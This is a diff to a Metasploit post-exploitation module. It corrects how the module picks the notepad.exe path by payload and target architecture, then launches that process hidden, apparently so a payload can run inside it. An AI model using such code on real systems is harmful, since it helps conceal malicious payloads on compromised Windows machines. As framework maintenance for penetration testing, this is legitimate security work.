@@ -164,10 +164,14 @@ class Metasploit3 < Msf::Post
 	def create_temp_proc(pay)
 		windir = client.fs.file.expand_path("%windir%")
 		# Select path of executable to run depending the architecture
-		if pay.arch.join == "x86"
+		if pay.arch.join == "x86" and client.platform =~ /x86/
 			cmd = "#{windir}\\System32\\notepad.exe"
-		else
+		elsif pay.arch.join == "x86_64" and client.platform =~ /x64/
+			cmd = "#{windir}\\System32\\notepad.exe"
+		elsif pay.arch.join == "x86_64" and client.platform =~ /x86/
 			cmd = "#{windir}\\Sysnative\\notepad.exe"
+		elsif pay.arch.join == "x86" and client.platform =~ /x64/
+			cmd = "#{windir}\\SysWOW64\\notepad.exe"
 		end
 		# run hidden
 		proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
